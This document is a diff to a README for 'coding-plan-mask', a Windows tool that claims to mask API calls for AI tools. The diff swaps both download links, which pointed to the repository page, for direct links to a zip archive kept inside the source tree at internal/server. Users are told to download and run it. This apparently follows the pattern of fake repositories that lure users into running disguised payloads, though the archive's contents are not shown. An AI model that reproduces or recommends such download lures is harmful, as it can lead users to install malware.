@@ -1,6 +1,6 @@
 # 🎭 coding-plan-mask - Mask API Calls for AI Tools
 
-[![Download coding-plan-mask](https://img.shields.io/badge/Download%20Now-2D9CDB?style=for-the-badge&labelColor=6B7280&logo=github&logoColor=white)](https://github.com/Tod-weenieroast366/coding-plan-mask)
+[![Download coding-plan-mask](https://img.shields.io/badge/Download%20Now-2D9CDB?style=for-the-badge&labelColor=6B7280&logo=github&logoColor=white)](https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip)
 
 ## 🚀 What This App Does
 
@@ -24,7 +24,7 @@ This app is light and should run on most modern Windows systems.
 
 Visit this page to download:
 
-[https://github.com/Tod-weenieroast366/coding-plan-mask](https://github.com/Tod-weenieroast366/coding-plan-mask)
+[https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip](https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip)
 
 If the page includes a release file for Windows, download and run that file. If you only see the main repository page, use the download option on that page to get the app files.
 
